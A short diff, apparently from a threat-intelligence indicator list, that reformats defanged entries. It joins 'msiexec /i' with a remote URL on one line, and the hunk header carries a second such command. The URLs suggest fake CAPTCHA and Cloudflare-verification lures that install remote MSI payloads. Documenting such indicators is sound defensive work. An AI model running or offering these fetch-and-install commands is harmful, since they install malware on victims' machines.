@@ -42,9 +42,8 @@ msiexec /i hxxps[:]//suzume-design[.]com/cloudflare
 
 ```
 hxxps[:]//nutraforyou[.]com
-msiexec /i
 
-hxxps[:]//pizzabyte[.]com[.]au/smartdetection/deviceverification/CF/path/captcha
+msiexec /i hxxps[:]//pizzabyte[.]com[.]au/smartdetection/deviceverification/CF/path/captcha
 ```
 
 ----
